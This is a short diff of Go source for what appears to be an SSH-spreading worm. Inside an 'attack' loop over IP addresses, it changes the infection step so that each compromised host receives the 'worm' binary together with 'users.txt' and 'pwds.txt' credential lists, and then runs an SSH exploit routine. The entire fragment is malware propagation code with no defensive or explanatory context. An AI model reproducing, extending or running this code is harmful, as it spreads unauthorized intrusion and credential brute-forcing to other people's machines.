@@ -38,7 +38,9 @@ func attack(wg *sync.WaitGroup, id int, baseIp [4]int) {
 				if is_infected {
 					continue
 				}
-				message := infection.SshInfect(ip_port)
+				message := infection.SshInfect(ip_port, "worm")
+				message = infection.SshInfect(ip_port, "users.txt")
+				message = infection.SshInfect(ip_port, "pwds.txt")
 				fmt.Println(message)
 				message = infection.SshExploit(ip_port)
 				fmt.Println(message)
